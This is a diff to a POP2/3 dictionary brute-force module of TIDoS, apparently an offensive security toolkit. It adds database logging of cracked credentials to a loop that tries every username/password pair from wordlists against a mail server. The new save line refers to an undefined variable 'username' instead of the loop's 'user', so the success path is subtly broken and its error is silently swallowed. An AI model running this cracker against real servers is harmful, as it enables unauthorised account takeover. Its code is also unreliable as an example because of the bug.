@@ -9,10 +9,14 @@
 #https://github.com/VainlyStrain/TIDoS
 
 
-import poplib
+import poplib, sys
 import time
 import socket
 from core.Core.colors import *
+from core.database.database_module import save_data
+from core.variables import database
+from core.methods.cache import targetname
+import inspect
 
 popuser = []
 poppass = []
@@ -22,7 +26,16 @@ info = "POP password cracker for common users using dictionaries."
 properties = {}
 
 def popbrute(web):
-
+    global name
+    name = targetname(web)
+    global lvl2
+    lvl2 = inspect.stack()[0][3]
+    global module
+    module = "VulnAnalysis"
+    global lvl1
+    lvl1 = "Brute Force Tools"
+    global lvl3
+    lvl3 = ""
     #print(R+'\n   ===================================')
     #print(R+'\n    P O P 2/3   B R U T E F O R C E R')
     #print(R+'   ——·‹›·––·‹›·——·‹›·——·‹›·––·‹›·——·‹›\n')
@@ -66,17 +79,28 @@ def popbrute(web):
         except IOError:
             print(R+' [-] Importing wordlist failed!')
 
+        found = False
         for user in popuser:
             for password in poppass:
                 try:
                     pop.user(str(user))
                     pop.pass_(password)
                     if True:
+                        found = True
                         print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
+                        data = username + " : " + password
+                        save_data(database, module, lvl1, lvl2, lvl3, name, data)
                         break
+                except KeyboardInterrupt:
+                    if not found:
+                        data = "Nothing found."
+                        save_data(database, module, lvl1, lvl2, lvl3, name, data)
+                        sys.exit(1)
                 except:
                     print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')
-
+        if not found:
+            data = "Nothing found."
+            save_data(database, module, lvl1, lvl2, lvl3, name, data)
     except:
         print(R+' [-] Target seems to be down!')
 
